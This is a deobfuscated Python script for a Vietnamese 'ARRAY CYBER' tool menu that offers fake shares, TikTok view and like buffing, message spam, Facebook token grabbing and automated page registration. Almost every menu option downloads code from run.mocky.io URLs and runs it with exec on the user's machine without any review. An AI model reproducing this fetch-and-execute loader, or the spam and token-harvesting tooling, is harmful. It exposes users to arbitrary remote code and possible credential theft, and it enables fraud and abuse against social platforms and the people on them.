# Kramer/Specter Deobf by KhanhNguyen9872
# file name: [goparraycyber-obf.py] (py - 3.11)
# dump -> code 0

import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
import os, sys
try:
  from faker import Faker
  from requests import session
  from colorama import Fore, Style
  import requests, random, re
  from random import randint
  import requests,pystyle
except:
  os.system("pip install faker")
  os.system("pip install requests")
  os.system("pip install colorama")
  os.system('pip install requests && pip install bs4 && pip install pystyle')
  print('__Vui Lòng Chạy Lại Tool__')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
#MÀU
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;39m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#ĐÁNH DẤU BẢN QUYỀN
dev="\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"
def banner():
 banner = f"""\033[1;39m
 █████╗ ██████╗ ██████╗  █████╗ ██╗   ██╗     ██████╗██╗   ██╗██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
███████║██████╔╝██████╔╝███████║ ╚████╔╝     ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
██╔══██║██╔══██╗██╔══██╗██╔══██║  ╚██╔╝      ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║██║  ██║   ██║       ╚██████╗   ██║   ██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝        ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝

\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;39m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
\033[1;39m┌──────────────────────── ARRAY CYBER ────────────────────────┐
\033[1;39m║   \033[1;39mPYTHON VERSION\033[1;39m 3.0                                        \033[1;39m║
\033[1;39m└─────────────────────────────────────────────────────────────┘
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
 
 
# =======================[RUN]=======================#
while True:
	os.system('clear')
	banner()
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;39m║   \033[1;39mMạng Xã Hội     \033[1;39m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m1\033[1;31m]   \033[1;39mSHARE ẢO TOKEN ĐA LUỒNG TOOL        ")
	print("\033[1;31m[\033[1;39m2\033[1;31m]   \033[1;39mVIEW TIKTOK ĐA LUỒNG              ")
	print("\033[1;31m[\033[1;39m3\033[1;31m]   \033[1;39mTOOL BUFF TYM TIKTOK                                              ")
	print("\033[1;31m[\033[1;39m4\033[1;31m]   \033[1;39mTOOL TDS TIKTOK ")
	print("\033[1;31m[\033[1;39m5\033[1;31m]   \033[1;39mTOOL TDS NOW ")
	print("\033[1;31m[\033[1;39m6.1\033[1;31m] \033[1;39mTOOL TDS ")
	print("\033[1;31m[\033[1;39m6.2\033[1;31m] \033[1;39mTOOL TDS FACEBOOK ")
	print("\033[1;31m[\033[1;39m7\033[1;31m]   \033[1;39mTOOL TTC TIKTOK  ")
	print("\033[1;31m[\033[1;39m8\033[1;31m]   \033[1;39mTool Tăng View Story Fb Bằng Page Pro5 Version 1.0 ")
	print("\033[1;31m[\033[1;39m10\033[1;31m]  \033[1;39mTOOL SPAM MESSAGE ")
	print("\033[1;31m[\033[1;39m11\033[1;31m]  \033[1;39mTOOL GET TOKEN FB  ")
	print("\033[1;31m[\033[1;39m12\033[1;31m]  \033[1;39mTOOL REG PAGE VỊ TRÍ  ")
	print("\033[1;31m[\033[1;39m17\033[1;31m]  \033[1;39mTool Auto Reg Page Pro5 1.0 ")
	print("\033[1;31m[\033[1;39m18\033[1;31m]  \033[1;39mTool Auto Reg Page Pro5 1.0 ")
	print("\033[1;31m[\033[1;39m19\033[1;31m]  \033[1;39mTool GET TOKEN PRO5 ")
	print("\033[1;31m[\033[1;39m20\033[1;31m]  \033[1;39mTool Tăng Member Group ")
	print("\033[1;31m[\033[1;39m21\033[1;31m]  \033[1;39mTool Tăng Share Ảo Bằng Page Pro5 Version 1.0 ")
	chon = input('\033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> \033[1;39m[\033[1;39mCHOOSE\033[1;39m]\033[1;39m: \033[1;39m')
	print('\033[1;39m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
	if chon == '1' :
		exec(requests.get('https://run.mocky.io/v3/b06cba12-5e87-4e25-9e9a-6ab484720647').text)
	if chon == '2':
		exec(requests.get('https://run.mocky.io/v3/eee1697c-8a2f-4afb-a88b-d24e49bb4746').text)
	if chon == '3' :
		exec(requests.get('https://run.mocky.io/v3/b0080c30-aaf5-46dc-9f00-3e15591f4a63').text)
	if chon == '4' :
		exec(requests.get('https://run.mocky.io/v3/fa5dc091-bd8b-45cf-aa6a-8e024d550610').text)
	if chon == '5' :
		exec(requests.get('https://run.mocky.io/v3/20edda80-b49a-4409-99d2-af0a5b86863c').text)
	if chon == '6.1':
		exec(requests.get('https://run.mocky.io/v3/d6322f1e-0713-42dc-bbc4-c58565b444d0').text)
	if chon == '6.2' :
		exec(requests.get('https://run.mocky.io/v3/4da6d01f-62ba-4836-b9b2-64d79f472fc0').text)
	if chon == '7' :
		exec(requests.get('https://run.mocky.io/v3/973cfb4e-a340-44be-a325-2026d7699f5f').text)
	if chon == '8' :
		exec(requests.get('https://run.mocky.io/v3/8beb44e6-9a7a-4981-81f7-c994b91dd67d').text)
	if chon == '9' :
		exec(requests.get('https://run.mocky.io/v3/e6235911-8862-43cc-9561-ed7453b9aadb').text)
	if chon == '10':
		exec(requests.get('https://run.mocky.io/v3/6ae3c97c-e807-42b2-866a-638999fb8daf').text)
	if chon == '11' :
		exec(requests.get('https://run.mocky.io/v3/ae5b77cc-58af-4cdb-8fe7-df5e3f19462f').text)
	if chon == '12' :
		exec(requests.get('https://run.mocky.io/v3/91bcc211-369d-4c2c-9e89-650e1e9271ad').text)
	if chon == '13':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '14':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '15':
		os.system('xdg-open https://byoneone.blogspot.com/2023/06/byoneone.html?m=1'); 
	if chon == '16':
		os.system('xdg-open https://arraycyber.link'); 
	if chon == '17' :
		exec(requests.get('https://run.mocky.io/v3/e708b8e8-3573-430d-830b-dba299f9a157').text)
	if chon == '18' :
		exec(requests.get('https://run.mocky.io/v3/4b6ca251-283b-4d49-85e9-cd0a731485ec').text)
	if chon == '19' :
		exec(requests.get('https://run.mocky.io/v3/7c0b1444-8685-4a33-98c8-18713bca2211').text)
	if chon == '20' :
		exec(requests.get('https://run.mocky.io/v3/94c0852d-7373-474f-ae39-b2dd2b8d78aa').text)
	if chon == '21' :
		exec(requests.get('https://run.mocky.io/v3/1e0c4843-6aa2-4af0-8955-55fe1e1c4d34').text)
	else :
		continue
